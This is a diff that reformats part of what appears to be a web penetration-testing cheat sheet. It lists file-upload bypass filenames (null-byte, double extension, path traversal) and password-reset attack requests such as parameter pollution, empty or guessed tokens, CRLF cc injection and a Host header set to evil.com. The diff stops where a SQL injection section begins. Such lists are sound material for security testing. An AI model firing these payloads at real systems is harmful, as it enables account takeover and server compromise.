@@ -3,72 +3,102 @@
 
 ## File Upload
 
-> .htaccess
+`.htaccess`
 
-> file.svg
+`file.svg`
 
-> file.SVg
+`file.SVg`
 
-> file.png.svg
+`file.png.svg`
 
-> file.php%00.png
+`file.php%00.png`
 
-> file.png' or '1'='1
+`file.png' or '1'='1`
 
-> ../../file.png
+`../../file.png`
 
-> file.'svg
+`file.'svg`
 
 ## Password Reset
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz&email=hacker@tld.xyz
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz&token=$BF$
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz&token=
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz&token=0000000
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz&token=nul
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz&token=nil
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz&token=HACKER-TOKEN
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz%0a%0dcc:hacker@tld.xyz
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz,hacker@tld.xyz
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz%20hacker@tld.xyz
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld.xyz|hacker@tld.xyz
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim
+```
 
-> POST /reset  
+```
+POST /reset  
 email=victim@tld
+```
 
-> POST /reset  
+```
+POST /reset  
 Host: evil.com
+```
 
-> POST /reset
+```
+POST /reset
 {"email":["victim@tld.xyz","hacker@tld.xyz"]}
+```
 
-> Check body response for password token
+**Check body response for password token**
 
-> Token generation: timestamp? userid? useremail? random?
+**Token generation: timestamp? userid? useremail? random?**
 
 ## SQL Injection
 
